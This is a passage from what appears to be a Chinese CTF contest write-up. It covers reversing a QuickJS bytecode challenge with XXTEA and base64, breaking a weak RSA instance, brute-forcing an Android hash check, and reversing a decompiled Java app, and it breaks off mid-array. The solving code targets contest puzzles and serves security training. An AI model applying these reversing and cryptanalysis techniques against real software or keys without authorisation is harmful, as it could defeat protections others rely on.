0x09, 0x40,0x35, 0x3F, 0x49, 0x3F, 0x3F, 0x0D, 0x41, 0x0E, 0x43, 0x06, 0x00, 0xC2, 0x03, 0x02, 0x03, 0x02, 0x09, 0x00, 0x01, 0x6E, 0x05, 0xE0, 0x03, 0x00, 0x01, 0x00, 0xE2, 0x03, 0x00, 0x01, 0x00, 0xE4, 0x03, 0x00, 0x00, 0x00, 0xE6, 0x03, 0x00, 0x01, 0x00, 0xE8, 0x03, 0x00, 0x02, 0x00, 0xD1, 0xE9, 0xC9, 0xD1, 0xC5, 0xB6, 0x9E, 0x47, 0xBF, 0x00, 0xAD, 0xCA, 0xB5, 0xCB, 0xC7, 0xC5, 0xA3, 0xEA, 0x3B, 0xD1, 0xC7, 0x71, 0x38, 0x99, 0x00, 0x00, 0x00, 0x42, 0xF5, 0x00, 0x00, 0x00, 0xD1, 0xC7, 0x47, 0xBE, 0xFF, 0x00, 0xAD, 0xD1, 0xC7, 0x47, 0xBD, 0x08, 0xA2, 0xBE, 0xFF, 0x00, 0xAD, 0xD1, 0xC7, 0x47, 0xBD, 0x10, 0xA2, 0xBE, 0xFF, 0x00, 0xAD, 0xD1, 0xC7, 0x47, 0xBD, 0x18, 0xA2, 0xBE, 0xFF, 0x00, 0xAD, 0x24, 0x04, 0x00, 0x49, 0x93, 0x02, 0xEC, 0xC2, 0xD2, 0xEA, 0x15, 0xD1, 0x42, 0x5B, 0x00, 0x00, 0x00, 0xC1, 0x24, 0x01, 0x00, 0x42, 0xF6, 0x00, 0x00, 0x00, 0xB5, 0xC6, 0x25, 0x02, 0x00, 0xD1, 0x42, 0x5B, 0x00, 0x00, 0x00, 0xC1, 0x25, 0x01, 0x00, 0xDE, 0x03, 0x01, 0x0B, 0x03, 0x12, 0x30, 0x27, 0x67, 0x35, 0x35, 0x49, 0x17, 0x12, 0x69, 0x06, 0x00, 0x00, 0xE0, 0xFF, 0xFF, 0xFF, 0xEF, 0x41, 0x0E, 0x43, 0x06, 0x00, 0xC4, 0x03, 0x02, 0x03, 0x02, 0x07, 0x00, 0x00, 0x5D, 0x05, 0xEE, 0x03, 0x00, 0x01, 0x00, 0xE2, 0x03, 0x00, 0x01, 0x00, 0xF0, 0x03, 0x00, 0x00, 0x00, 0xE0, 0x03, 0x00, 0x01, 0x00, 0xE8, 0x03, 0x00, 0x02, 0x00, 0xD1, 0xE9, 0xC9, 0x26, 0x00, 0x00, 0xCA, 0xB5, 0xCB, 0xC7, 0xC5, 0xA3, 0xEA, 0x46, 0xC6, 0xC7, 0xB7, 0xA1, 0x71, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC7, 0x24, 0x01, 0x00, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC7, 0xB6, 0x9D, 0x24, 0x01, 0x00, 0xBD, 0x08, 0xA0, 0xAF, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC7, 0xB7, 0x9D, 0x24, 0x01, 0x00, 0xBD, 0x10, 0xA0, 0xAF, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC7, 0xB8, 0x9D, 0x24, 0x01, 0x00, 0xBD, 0x18, 0xA0, 0xAF, 0x49, 0xB9, 0x94, 0x02, 0xEC, 0xB7, 0xD2, 0xEA, 0x06, 0xC6, 0xC6, 0xE9, 0xC5, 0x49, 0xC6, 0x28, 0xDE, 0x03, 0x13, 0x0B, 0x03, 0x12, 0x17, 0x27, 0x4E, 0x53, 0x53, 0x58, 0x1C, 0x12, 0x1D, 0x0E, 0x43, 0x06, 0x00, 0xC6, 0x03, 0x02, 0x0B, 0x02, 0x06, 0x00, 0x04, 0xF8, 0x01, 0x0D, 0xF4, 0x03, 0x00, 0x01, 0x00, 0xF6, 0x03, 0x00, 0x01, 0x00, 0xE0, 0x03, 0x00, 0x00, 0x00, 0xF8, 0x03, 0x00, 0x01, 0x00, 0xFA, 0x03, 0x00, 0x02, 0x00, 0xFC, 0x03, 0x00, 0x03, 0x00, 0xFE, 0x03, 0x00, 0x04, 0x00, 0x80, 0x04, 0x00, 0x05, 0x00, 0x82, 0x04, 0x00, 0x06, 0x00, 0x84, 0x04, 0x00, 0x07, 0x00, 0x86, 0x04, 0x00, 0x08, 0x00, 0x88, 0x04, 0x00, 0x09, 0x00, 0x8A, 0x04, 0x00, 0x0A, 0x00, 0xD1, 0xC1, 0xA9, 0xEA, 0x03, 0xC1, 0x28, 0x38, 0xE2, 0x00, 0x00, 0x00, 0xD1, 0x0A, 0xF0, 0xC9, 0x38, 0xE2, 0x00, 0x00, 0x00, 0xD2, 0x09, 0xF0, 0xCA, 0xC5, 0xE9, 0xB6, 0x9E, 0xCB, 0xC5, 0xC7, 0x47, 0xCC, 0xC5, 0xB5, 0x47, 0xC3, 0x04, 0xBF, 0x00, 0xC3, 0x05, 0x38, 0x9D, 0x00, 0x00, 0x00, 0x42, 0x06, 0x01, 0x00, 0x00, 0xBB, 0xBD, 0x34, 0xC7, 0xB6, 0x9D, 0x9B, 0x9D, 0x24, 0x01, 0x00, 0xC3, 0x08, 0xB5, 0xC3, 0x09, 0xC2, 0x08, 0x90, 0xC3, 0x08, 0xB5, 0xA5, 0x69, 0x9B, 0x00, 0x00, 0x00, 0xC2, 0x09, 0xC2, 0x05, 0x9D, 0xBF, 0x01, 0xAD, 0xC4, 0x09, 0xB7, 0xA2, 0xB8, 0xAD, 0xC3, 0x07, 0xB5, 0xC3, 0x0A, 0xC2, 0x0A, 0xC7, 0xA3, 0xEA, 0x43, 0xC5, 0xC2, 0x0A, 0xB6, 0x9D, 0x47, 0xC3, 0x04, 0xC8, 0xBA, 0xA2, 0xC2, 0x04, 0xB7, 0xA0, 0xAE, 0xC2, 0x04, 0xB8, 0xA2, 0xC8, 0xB9, 0xA0, 0xAE, 0x9D, 0xC2, 0x09, 0xC2, 0x04, 0xAE, 0xC6, 0xC2, 0x0A, 0xB8, 0xAD, 0xC2, 0x07, 0xAE, 0x47, 0xC8, 0xAE, 0x9D, 0xAE, 0xC3, 0x06, 0xC5, 0xC2, 0x0A, 0x71, 0xC5, 0xC2, 0x0A, 0x47, 0xC2, 0x06, 0x9D, 0xBF, 0x02, 0xAD, 0x16, 0x49, 0xCC, 0x93, 0x0A, 0xEC, 0xB9, 0xC5,0xB5, 0x47, 0xC3, 0x04, 0xC8, 0xBA, 0xA2, 0xC2, 0x04, 0xB7, 0xA0, 0xAE, 0xC2, 0x04, 0xB8, 0xA2, 0xC8, 0xB9, 0xA0, 0xAE, 0x9D, 0xC2, 0x09, 0xC2, 0x04, 0xAE, 0xC6, 0xC2, 0x0A, 0xB8, 0xAD, 0xC2, 0x07, 0xAE, 0x47, 0xC8, 0xAE, 0x9D, 0xAE, 0xC3, 0x06, 0xC5, 0xC7, 0x71, 0xC5, 0xC7, 0x47, 0xC2, 0x06, 0x9D, 0xBF, 0x03, 0xAD, 0x16, 0x49, 0xCC, 0xED, 0x5F, 0xFF, 0x38, 0xE4, 0x00, 0x00, 0x00, 0x38, 0xE1, 0x00, 0x00, 0x00, 0xC5, 0x09, 0xF0, 0x23, 0x01, 0x00, 0xDE, 0x03, 0x23, 0x15, 0x03, 0x1C, 0x08, 0x08, 0x30, 0x30, 0x1D, 0x44, 0x85, 0x3F, 0x35, 0x21, 0x30, 0x2B, 0xBC, 0x58, 0x17, 0x1C, 0xBC, 0x4E, 0x13, 0x06, 0x00, 0x00, 0x20, 0x37, 0xEF, 0xC6, 0xE3, 0x41, 0x06, 0x00, 0x00, 0xE0, 0xFF, 0xFF, 0xFF, 0xEF, 0x41, 0x06, 0x00, 0x00, 0xE0, 0xFF, 0xFF, 0xFF, 0xEF, 0x41, 0x06, 0x00, 0x00, 0xE0, 0xFF, 0xFF, 0xFF, 0xEF, 0x41, 0x0E, 0x43, 0x06, 0x00, 0xC8, 0x03, 0x01, 0x03, 0x01, 0x04, 0x00, 0x01, 0x32, 0x04, 0xB0, 0x01, 0x00, 0x01, 0x00, 0x8E, 0x04, 0x00, 0x00, 0x00, 0x90, 0x04, 0x00, 0x01, 0x00, 0xE8, 0x03, 0x00, 0x02, 0x00, 0xC1, 0xC9, 0xC1, 0xCA, 0xB5, 0xCB, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC7, 0x91, 0xCB, 0x24, 0x01, 0x00, 0x42, 0x37, 0x00, 0x00, 0x00, 0xBD, 0x10, 0x24, 0x01, 0x00, 0xCE, 0xE9, 0xB6, 0xA9, 0xEA, 0x06, 0xBF, 0x00, 0xC6, 0x9D, 0xCA, 0xC6, 0x94, 0x00, 0xC7, 0xD1, 0xE9, 0xA3, 0xEB, 0xD7, 0xC5, 0x28, 0xDE, 0x03, 0x3E, 0x08, 0x03, 0x0D, 0x0D, 0x0E, 0x76, 0x35, 0x12, 0x21, 0x07, 0x02, 0x30, 0x0E, 0x43, 0x06, 0x00, 0xCA, 0x03, 0x01, 0x03, 0x01, 0x06, 0x00, 0x00, 0x52, 0x04, 0xB0, 0x01, 0x00, 0x01, 0x00, 0x8E, 0x04, 0x00, 0x00, 0x00, 0xE8, 0x03, 0x00, 0x01, 0x00, 0xF8, 0x03, 0x00, 0x02, 0x00, 0xC1, 0xC9, 0xB5, 0xCA, 0xC6, 0xD1, 0xE9, 0xA3, 0xEA, 0x47, 0x38, 0x09, 0x01, 0x00, 0x00, 0xD1, 0x42, 0x0A, 0x01, 0x00, 0x00, 0xC6, 0xB6, 0x24, 0x02, 0x00, 0xBD, 0x10, 0xF0, 0xB9, 0xA0, 0x38, 0x09, 0x01, 0x00, 0x00, 0xD1, 0x42, 0x0A, 0x01, 0x00, 0x00, 0xC6, 0x8F, 0xCE, 0xB6, 0x24, 0x02, 0x00, 0xBD, 0x10, 0xF0, 0xAF, 0xCF, 0xBE, 0xFF, 0x00, 0xAD, 0xCB, 0xC5, 0x38, 0x99, 0x00, 0x00, 0x00, 0x42, 0xF5, 0x00, 0x00, 0x00, 0xC7, 0x24, 0x01, 0x00, 0x9D, 0xC9, 0x93, 0x01, 0xEC, 0xB5, 0xC5, 0x28, 0xDE, 0x03, 0x4A, 0x09, 0x03, 0x0D, 0x0D, 0x21, 0xDA, 0x21, 0x58, 0x0D, 0x0D, 0x0E, 0x43, 0x06, 0x00, 0xCC, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x29, 0xDE, 0x03, 0x56, 0x01, 0x03, 0x0E, 0x43, 0x06, 0x00, 0x00, 0x01, 0x09, 0x01, 0x04, 0x00, 0x00, 0xE6, 0x01, 0x0A, 0xB0, 0x01, 0x00, 0x01, 0x00, 0x8E, 0x04, 0x00, 0x00, 0x00, 0x90, 0x04, 0x00, 0x01, 0x00, 0x96, 0x04, 0x00, 0x02, 0x00, 0x98, 0x04, 0x00, 0x03, 0x00, 0x9A, 0x04, 0x00, 0x04, 0x00, 0x9C, 0x04, 0x00, 0x05, 0x00, 0x9E, 0x04, 0x00, 0x06, 0x00, 0xA0, 0x04, 0x00, 0x07, 0x00, 0xE8, 0x03, 0x00, 0x08, 0x00, 0xC1, 0xC9, 0xC1, 0xCC, 0xC1, 0xC3, 0x07, 0xB5, 0xC3, 0x08, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC2, 0x08, 0x91, 0xC3, 0x08, 0x24, 0x01, 0x00, 0xCA, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC2, 0x08, 0x91, 0xC3, 0x08, 0x24, 0x01, 0x00, 0xCB, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC2, 0x08, 0x91, 0xC3, 0x08, 0x24, 0x01, 0x00, 0xCC, 0xC6, 0xB7, 0xA1, 0xC3, 0x04, 0xC6, 0xB8, 0xAD, 0xB9, 0xA0, 0xC7, 0xB9, 0xA1, 0xAF, 0xC3, 0x05, 0xC7, 0xBD, 0x0F, 0xAD, 0xB7, 0xA0, 0xC8, 0xBB, 0xA1, 0xAF, 0xC3, 0x06, 0xC8, 0xBD, 0x3F, 0xAD, 0xC3, 0x07, 0x38, 0x11, 0x01, 0x00, 0x00, 0xC7, 0xEF, 0xEA, 0x09, 0xBD, 0x40, 0xC4, 0x07, 0xC3, 0x06, 0xEC, 0x0E, 0x38, 0x11, 0x01, 0x00, 0x00, 0xC8, 0xEF, 0xEA, 0x05, 0xBD, 0x40, 0xC3, 0x07, 0xC5, 0x38, 0xE6, 0x00, 0x00, 0x00, 0x41, 0xEA, 0x00, 0x00, 0x00, 0x42, 0x12,0x01, 0x00, 0x00, 0xC2, 0x04, 0x24, 0x01, 0x00, 0x9D, 0x38, 0xE6, 0x00, 0x00, 0x00, 0x41, 0xEA, 0x00, 0x00, 0x00, 0x42, 0x12, 0x01, 0x00, 0x00, 0xC2, 0x05, 0x24, 0x01, 0x00, 0x9D, 0x38, 0xE6, 0x00, 0x00, 0x00, 0x41, 0xEA, 0x00, 0x00, 0x00, 0x42, 0x12, 0x01, 0x00, 0x00, 0xC2, 0x06, 0x24, 0x01, 0x00, 0x9D, 0x38, 0xE6, 0x00, 0x00, 0x00, 0x41, 0xEA, 0x00, 0x00, 0x00, 0x42, 0x12, 0x01, 0x00, 0x00, 0xC2, 0x07, 0x24, 0x01, 0x00, 0x9D, 0xC9, 0xC1, 0xD0, 0xCF, 0xCA, 0xC1, 0xC4, 0x07, 0xC4, 0x06, 0xC4, 0x05, 0xC3, 0x04, 0xC2, 0x08, 0xD1, 0xE9, 0xA3, 0x6A, 0x2A, 0xFF, 0xFF, 0xFF, 0xC5, 0x28, 0xDE, 0x03, 0x59, 0x18, 0x03, 0x0D, 0x0D, 0x12, 0x13, 0x4E, 0x4E, 0x4E, 0x1C, 0x3A, 0x3F, 0x21, 0x30, 0x21, 0x3A, 0x18, 0x08, 0x6C, 0x6C, 0x6C, 0x71, 0x17, 0x30, 0x35, 0x0E, 0x43, 0x06, 0x00, 0xCE, 0x03, 0x01, 0x04, 0x01, 0x04, 0x00, 0x00, 0x84, 0x01, 0x05, 0xD0, 0x03, 0x00, 0x01, 0x00, 0xB0, 0x01, 0x00, 0x00, 0x00, 0xA6, 0x04, 0x00, 0x01, 0x00, 0xA8, 0x04, 0x00, 0x02, 0x00, 0xAC, 0x01, 0x00, 0x03, 0x00, 0xD1, 0xE9, 0xB6, 0xA3, 0xEA, 0x0D, 0x38, 0x15, 0x01, 0x00, 0x00, 0x04, 0xEE, 0x00, 0x00, 0x00, 0xEF, 0x29, 0x38, 0x15, 0x01, 0x00, 0x00, 0x04, 0x16, 0x01, 0x00, 0x00, 0xD1, 0xB5, 0x47, 0x9D, 0xEF, 0x0E, 0xD1, 0xB5, 0x47, 0xC9, 0x38, 0xE6, 0x00, 0x00, 0x00, 0x42, 0xEB, 0x00, 0x00, 0x00, 0xC5, 0x24, 0x01, 0x00, 0xCA, 0x04, 0x17, 0x01, 0x00, 0x00, 0x11, 0x39, 0x18, 0x01, 0x00, 0x00, 0x0E, 0x38, 0xE3, 0x00, 0x00, 0x00, 0xC6, 0x38, 0x18, 0x01, 0x00, 0x00, 0xF0, 0xCF, 0xE9, 0xBD, 0x70, 0xAA, 0xEA, 0x0D, 0x38, 0x15, 0x01, 0x00, 0x00, 0x04, 0xEE, 0x00, 0x00, 0x00, 0xEF, 0x29, 0x04, 0x19, 0x01, 0x00, 0x00, 0xCC, 0xC7, 0xC8, 0xA9, 0xEA, 0x0E, 0x38, 0x15, 0x01, 0x00, 0x00, 0x04, 0x1A, 0x01, 0x00, 0x00, 0xEF, 0x0E, 0x29, 0x38, 0x15, 0x01, 0x00, 0x00, 0x04, 0xEE, 0x00, 0x00, 0x00, 0xEF, 0x29, 0xDE, 0x03, 0x76, 0x11, 0x03, 0x21, 0x3B, 0x08, 0x54, 0x17, 0x4F, 0x3F, 0x40, 0x26, 0x3B, 0x09, 0x21, 0x1D, 0x3F, 0x09, 0x3C, 0x00, 0x00, 0x00, 0xDD, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; int main(int argc, char **argv) { JSRuntime *rt; JSContext *ctx; rt = JS_NewRuntime(); ctx = JS_NewContextRaw(rt); JS_SetModuleLoaderFunc(rt, NULL, js_module_loader, NULL); JS_AddIntrinsicBaseObjects(ctx); JS_AddIntrinsicDate(ctx); JS_AddIntrinsicEval(ctx); JS_AddIntrinsicStringNormalize(ctx); JS_AddIntrinsicRegExp(ctx); JS_AddIntrinsicJSON(ctx); JS_AddIntrinsicProxy(ctx); JS_AddIntrinsicMapSet(ctx); JS_AddIntrinsicTypedArrays(ctx); JS_AddIntrinsicPromise(ctx); JS_AddIntrinsicBigInt(ctx); js_std_add_helpers(ctx, argc, argv); js_std_eval_binary(ctx, qjsc_s, sizeof(qjsc_s), 0); js_std_loop(ctx); JS_FreeContext(ctx);JS_FreeRuntime(rt); return 0; } 再照上文编译并运行程序，即可得到一段比较直观的输出 然后逐一分析还原文件 经过分析可以知道 先进行了一个base64加密 然后进行了一个xxtea base64我们可以在表上看到 有编码表 当往下分析到 0x9e3779b9很明显就是xxtea解密 这时 我们就可以 先用xxtea解密 #include &lt;stdio.h&gt; #include &lt;stdint.h&gt; #define DELTA 0x9e3779b9 #define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z))) void btea(uint32_t *v, int n, uint32_t const key[4]) { uint32_t y, z, sum; unsigned p, rounds, e; if (n &gt; 1) /* Coding Part */ { rounds = 6 + 52/n; sum = 0; z = v[n-1]; do { sum += DELTA; e = (sum &gt;&gt; 2) &amp; 3; for (p=0; p&lt;n-1; p++) { y = v[p+1]; z = v[p] += MX; } y = v[0]; z = v[n-1] += MX; } while (--rounds); } else if (n &lt; -1) /* Decoding Part */ { n = -n; rounds = 6 + 52/n; sum = rounds*DELTA; y = v[0]; do { e = (sum &gt;&gt; 2) &amp; 3; for (p=n-1; p&gt;0; p--) { z = v[p-1]; y = v[p] -= MX; } z = v[n-1]; y = v[0] -= MX; sum -= DELTA; } while (--rounds); } } int main() { //uint32_t v[2]= {1,2}; //uint32_t const k[4]= {2,2,3,4}; int8_t cipher[] = {5, 174,208,206,68, 31,128,181, 188, 54, 175,76,105, 133,9,252,108,195,201,113,70,53,61, 229, 169, 92, 106,190, 160,127, 212, 167,7,9,50, 216, 106,195, 45,98, 134, 114, 165,145, 35,229,151,35, 49,219, 93,255,231,5,115,98}; const int8_t key[] =\"no_thing_is_true\"; uint32_t *v = (uint32_t *)cipher; const uint32_t *k =(const uint32_t *)key; int n= sizeof(cipher)/ sizeof(uint32_t); //n的绝对值表示v的长度，取正表示加密，取负表示解密 // v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 // printf(\"加密前原始数据：%u %u\\n\",v[0],v[1]); // btea(v, n, k); // printf(\"加密后的数据：%u %u\\n\",v[0],v[1]); btea(v, -n, k); // printf(\"解密后的数据：%u %u\\n\",v[0],v[1]); printf(\"%s\",cipher); printf(\"\\n\"); return 0; } 之后进行base64解密 得知flag crypto拟态签到题 base64解码即可 onlyrsa 描述:RSA say : My birthday is in November instead of October 考虑base=11下的多项式，跟cryptoctf2020的decentRSA一样 当时没电脑，ipad做题…在线sage： 分解出两个，只有p是素数，直接在Zmod(p)下求解即可 from libnum import * p=16249579302136675275737472669394168521026727339712083110552530420348131906271518040549529167354613121510156841352658645018277766962773342379074137176993546193979134201416444089373463960664685121485689105129185197998903479181913613273443541075619342246119648308939006396145123630152777688592984718084919469059 n=264048827496427248021277383801027180195275776366915828865010362454006394906519399441496561006668252031429735502465174250525698696973129422193405161920872162928097673289330345041221985548078586423910246601720647996170161319016119241836415788315729493164331517547663558380515400720081995290120793014108439083514403659082115510258023834737471488528527557960636984676435543300074504679264476413252780514962473070445293528877641502742438571110744667739728450283295649865745629276142949963507003094791773183928894536793857609738113546410753895719242547720815692998871947957214118354127328586542848234994500987288641595105 e=65537 c=76196483810925191371357319946893762223027002702624516192769497540954799651198719100683206759706879828894501526423422596543748404479640715319801018211652987852179907519286760601944889601355220646374788026632971331786307898234821477134265724962397355614076896148563340833323366935479885600112872998594315513803419069126624158092821269145991266528158747750965226483644012365861166608598063649804899693010576080857540523307078138634628539419178875838147396170651777949577793359622498517581948006585916952705460782942977789615065947303447566918741750017127110484065354974088489869377128636357092420660532261674969708694 phi=(p-1)*(q-1) phi=p-1 d=invmod(e, phi) m=pow(c,d,p) print(n2s(m)) mobilehahahaha8个输入框，分别输入8个16进制数（必须大写） 题目逻辑会将当前输入的字符串转换成16进制数字，并且取出当前每个数字的最高bit作为一个特殊的处理变量（用于选择hash算法） 当最后一个数字的最高bit不为1的时候，会选择使用HMacSha256作为hash手法，不过此时的key会有所差异 当最高位为1的时候，分别使用如下的算法：switch(signs &amp; 7)Case 5:SHA384Case 4:SHA256Case 3:SHA224Case 2:SHA1Case 1:MD5 但是存在表替换的情况Case 0:MD2 但是存在表替换的情况 后来发现漏了一段，在函数的最开头会将密钥（keys）计算其对应的MD5存起来，然后会将下标signss^0xAB 考虑到最后输入，会将我们的输入打印出来，所以此时说明输入的数组去掉最高位之后，必定是可见字符，加上app中提示了说不会出现小写字母，于是直接把java代码抠出来，爆破可见字符写一个爆破程序即可得到答案。 studydesk逆向相关逻辑 public class MainActivity$a implements View$OnClickListener { public MainActivity$a(MainActivity arg1) { this.b = arg1; super(); } public void onClick(View arg15) { String v11; BigDecimal v10; int v4_1; int v9; KeyListener v7; String v15 = this.b.o.getText().toString(); int v2 = 0x20; if(v15.length() != v2) { } else { byte[] v0 = class_a.arr; ByteArrayOutputStream v3 = new ByteArrayOutputStream(); StringBuilder v4 = new StringBuilder(); int v5 = v0.length; int v6 = 0; while(true) { v7 = null; if(v6 &lt; v5) { v9 = v15.indexOf(v0[v6]); if(v9 == -1) { v0 = ((byte[])v7); } else { v4.append(Integer.toBinaryString((v9 &amp; 0x3F) + v2).substring(1)); ++v6; continue; } } else { break; } goto label_56; } int v0_1; for(v0_1 = 0; v0_1 &lt; (40 - v4.length() % 40) % 40; ++v0_1) { v4.append('0'); } String v0_2 = v4.toString(); for(v2 = 0; v2 &lt; v0_2.length(); v2 = v4_1) { v4_1 = v2 + 8; v3.write(((byte)(Integer.parseInt(v0_2.substring(v2, v4_1), 2) &amp; 0xFF))); } v0 = v3.toByteArray(); label_56: if(v0 == null) { goto label_157; } BigDecimal v2_1 = new BigDecimal(\"1\"); BigDecimal v3_1 = new BigDecimal(\"0\"); BigDecimal v4_2 = new BigDecimal(\"6\"); MathContext v5_1 = new MathContext(360, RoundingMode.HALF_UP); MathContext v6_1 = new MathContext(720, RoundingMode.HALF_UP); v9 = 0; while(true) { v2_1 = class_a.func(new BigDecimal(\"2\").subtract(class_a.func(new BigDecimal(4).subtract(v2_1.multiply(v2_1, v6_1), v6_1), v6_1)), v6_1); v4_2 = new BigDecimal(\"2\").multiply(v4_2, v5_1); v10 = new BigDecimal(\"0.5\").multiply(v2_1.multiply(v4_2, v5_1), v5_1); v11 = \"StudyDesk:\"; if(v10.compareTo(v3_1) == 0) { break; } ++v9; if(v9 % 30 == 0) { StringBuilder v3_2 = a.e(\"running: \"); v3_2.append(v9 / 6); v3_2.append(\"%\"); Log.i(v11, v3_2.toString()); } v3_1 = v10; } Log.i(v11, \"running: 100%\"); String v2_2 = v10.toString().replace(\".\", \"\"); int v3_3 = 0; while(true) { if(v3_3 &lt; v2_2.length()) { v4_1 = v3_3 + 2; if((((byte)(Integer.parseInt(v2_2.substring(v3_3, v4_1), 10) &amp; 0xFF))) != v0[v3_3 / 2]) { v0_1 = 0; } else { v3_3 = v4_1; continue; } } else { break; } goto label_120; } v0_1 = 1; label_120: if(v0_1 == 0) { goto label_157; } Toast.makeText(this.b, \"Congs, good student!\", 0).show(); this.b.q.setText(String.format(\"flag{%s}\", v15)); this.b.p.setText(\"Congs!\"); this.b.p.setClickable(false); this.b.o.setKeyListener(v7); return; } label_157: Toast.makeText(this.b, \"Nonono, study harder please\", 0).show(); } } public class class_a { public static byte[] arr; public static { class_a.arr = new byte[]{0x73, 0x6F, 43, 0x72, 0x74, 45, 0x30, 36, 84, 98, 89, 36, 38, 66, 38, 43, 84, 0x79, 50, 101, 101, 43, 100, 87, 69, 0x6F, 51, 66, 89, 49, 69, 51, 101, 51, 53, 0x74, 45, 98, 98, 0x72, 50, 36, 98, 50, 85, 85, 85, 107, 66, 36, 53, 51, 0x6F, 0x72, 89, 89, 66, 50, 33, 66, 0x5F, 66, 101, 0x79, 0x5F, 0x40, 33, 66, 50, 0x40, 85, 85, 45, 43, 36, 50, 0x74, 0x30, 85, 0x73, 0x5F, 0x40, 49, 0x72, 50, 101, 101, 51, 51, 43, 53, 51, 53, 51, 85, 50, 0x40, 0x79, 53, 36, 0x40, 69, 89, 98, 45, 0x6F, 101, 36, 97, 66, 100, 0x30, 0x73, 97, 0x30, 36, 0x6F, 101, 50, 0x5F, 49, 0x30, 0x40, 89, 0x74, 85, 0x30, 85, 0x73, 89, 43, 89, 97, 0x30, 89, 0x72, 97, 100, 38, 50, 0x74, 51, 98, 0x75, 0x5F, 50, 0x74, 0x73, 0x6F, 84, 98, 89, 69, 0x6F, 100, 0x30, 0x6F, 98, 89, 0x72, 0x40, 50, 36, 66, 89, 101, 0x72, 51, 84, 51, 50, 36, 38, 0x40, 0x30, 53, 51, 0x30, 49, 97, 0x74, 89, 101, 85, 97, 66, 84, 97, 45, 43, 100, 89, 45, 0x30, 0x73, 0x30, 0x40, 97, 100, 98, 51, 100, 0x6F, 0x73, 50, 53, 101, 66, 101, 0x6F, 0x75, 50, 45, 0x5F, 51, 82, 50, 89, 87, 101, 50, 89, 0x30, 89, 101, 43, 89, 36, 38, 61, 101, 0x40, 84, 89, 0x5F, 66, 0x74, 49, 0x40, 87, 97, 43, 0x5F, 0x73, 43, 0x30, 89, 45, 84, 89, 33, 89, 107, 53, 85, 0x30, 98, 98, 0x5F, 50, 107, 66, 101, 0x6F, 51, 97, 33, 66, 97, 0x75, 51, 0x74, 51, 97, 0x40, 89, 107, 98, 51, 69, 0x40, 73, 0x5F, 0x30, 85, 0x74, 0x30, 97}; } public static BigDecimal func(BigDecimal arg3, MathContext arg4) { BigDecimal v1; BigDecimal v0; for(v0 = arg3; true; v0 = v1) { v1 = new BigDecimal(\"0.5\").multiply(v0.add(arg3.divide(v0, arg4), arg4), arg4); if(v1.compareTo(v0) == 0) { return v1; } } return v1; } } 有调试环境的师傅可以给1EE下断点看下v2的值。然后去判断下一开始的情况去逆向。 有java环境的也可以稍微改改代码然后跑下直接拿数值，对比的数据是不根据输入变化的,例如获取v2的直接代码 import org.python.antlr.ast.Str; import java.math.BigDecimal; import java.math.MathContext; import java.math.RoundingMode; public class test { public static void main(String[] args) { BigDecimal v2_1 = new BigDecimal(\"1\"); BigDecimal v3_1 = new BigDecimal(\"0\"); BigDecimal v10; BigDecimal v4_2 = new BigDecimal(\"6\"); MathContext v5_1 = new MathContext(360, RoundingMode.HALF_UP); MathContext v6_1 = new MathContext(720, RoundingMode.HALF_UP); int v9 = 0; while (true) { v2_1 = class_a.func(new BigDecimal(\"2\").subtract(class_a.func(new BigDecimal(4).subtract(v2_1.multiply(v2_1, v6_1), v6_1), v6_1)), v6_1); v4_2 = new BigDecimal(\"2\").multiply(v4_2, v5_1); v10 = new BigDecimal(\"0.5\").multiply(v2_1.multiply(v4_2, v5_1), v5_1); if (v10.compareTo(v3_1) == 0) { break; } ++v9; v3_1 = v10; } String v2_2 = v10.toString().replace(\".\", \"\"); System.out.println(v2_2); } } ma=[0x73, 0x6F, 43, 0x72, 0x74, 45, 0x30, 36, 84, 98, 89, 36, 38, 66, 38, 43, 84, 0x79, 50, 101, 101, 43, 100, 87, 69, 0x6F, 51, 66, 89, 49, 69, 51, 101, 51, 53, 0x74, 45, 98, 98, 0x72, 50, 36, 98, 50, 85, 85, 85, 107, 66, 36, 53, 51, 0x6F, 0x72, 89, 89, 66, 50, 33, 66, 0x5F, 66, 101, 0x79, 0x5F, 0x40, 33, 66, 50, 0x40, 85, 85, 45, 43, 36, 50, 0x74, 0x30, 85, 0x73, 0x5F, 0x40, 49, 0x72, 50, 101, 101, 51, 51, 43, 53, 51, 53, 51, 85, 50, 0x40, 0x79, 53, 36, 0x40, 69, 89, 98, 45, 0x6F, 101, 36, 97, 66, 100, 0x30, 0x73, 97, 0x30, 36, 0x6F, 101, 50, 0x5F, 49, 0x30, 0x40, 89, 0x74, 85, 0x30, 85, 0x73, 89, 43, 89, 97, 0x30, 89, 0x72, 97, 100, 38, 50, 0x74, 51, 98, 0x75, 0x5F, 50, 0x74, 0x73, 0x6F, 84, 98, 89, 69, 0x6F, 100, 0x30, 0x6F, 98, 89, 0x72, 0x40, 50, 36, 66, 89, 101, 0x72, 51, 84, 51, 50, 36, 38, 0x40, 0x30, 53, 51, 0x30, 49, 97, 0x74, 89, 101, 85, 97, 66, 84, 97, 45, 43, 100, 89, 45, 0x30, 0x73, 0x30, 0x40, 97, 100, 98, 51, 100, 0x6F, 0x73, 50, 53, 101, 66, 101, 0x6F, 0x75, 50, 45, 0x5F, 51, 82, 50, 89, 87, 101, 50, 89, 0x30, 89, 101, 43, 89, 36, 38, 61, 101, 0x40, 84, 89, 0x5F, 66, 0x74, 49, 0x40, 87, 97, 43, 0x5F, 0x73, 43, 0x30, 89, 45, 84, 89, 33, 89, 107, 53, 85, 0x30, 98, 98, 0x5F, 50, 